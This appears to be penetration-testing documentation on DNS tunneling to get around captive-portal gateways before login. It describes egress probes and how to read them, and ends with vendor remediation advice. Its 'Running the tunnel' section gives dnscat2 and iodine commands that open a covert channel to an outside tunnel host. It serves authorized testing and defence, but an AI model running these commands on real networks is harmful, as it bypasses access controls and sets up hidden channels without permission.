# Technique: DNS egress & tunneling (pre-auth egress matrix)

## Why it works

The gateway's firewall usually blocks generic web egress but leaves DNS
working, on the theory that "the client needs DNS to find the splash page". If
the walled-garden DNS path proxies arbitrary queries to the internet, you own a
covert channel: `dnscat2`/`iodine` encapsulate an IP stream inside DNS TXT/
NULL/CNAME records. A single open UDP/53 to any external resolver pre-auth turns
"no internet" into "slow internet that the firewall can't see".

## GhostLink's egress probes

```bash
ghostlink egress --no-color
```

| Probe | What it establishes |
| --- | --- |
| TCP connect matrix (53, 80, 123, 443, 500, 1194, 4500, 8443 → 1.1.1.1, 8.8.8.8) | which TCP egress the portal leaves open pre-auth |
| UDP/53 probe to 1.1.1.1 / 8.8.8.8 / gateway | whether external resolvers answer — the tunneling primitive |
| ICMP probe | whether raw ping survives (usually dropped by portals) |

Interpreting the result:

- **UDP/53 answers + portal present** → `dnscat2`-class tunnel viable. High-severity finding.
- **TCP/443 open but UDP/53 filtered** → DoH/DoT-over-TCP-443 still possible if the portal's TLS inspection is absent; test with `dns.google` reachability.
- **Everything filtered except the splash page** → the portal is doing strict default-deny; fall back to MAC/walled-garden vectors.

## Running the tunnel (lab / authorized scope only)

```bash
# server (authorized-side): dnscat2-server or iodine0
dnscat2-server <public-tunnel-domain>

# client behind the paywall:
dnscat2 <domain-sending-to-tunnel>
# iodine variant: iodine -f -P password tun0 ns.tunnel.example
```

Only do this against a server you control, on the network you are authorized
to test — never through someone else's resolver.

## Vendor remediation notes

- Force DNS to the internal resolver only: drop UDP/53 to external IPs at the
  gateway; make the walled DNS path a forwarder with query logging.
- Rate-limit TXT/NULL queries per client and alert on high-entropy subdomains
  (the classic dnscat signature).
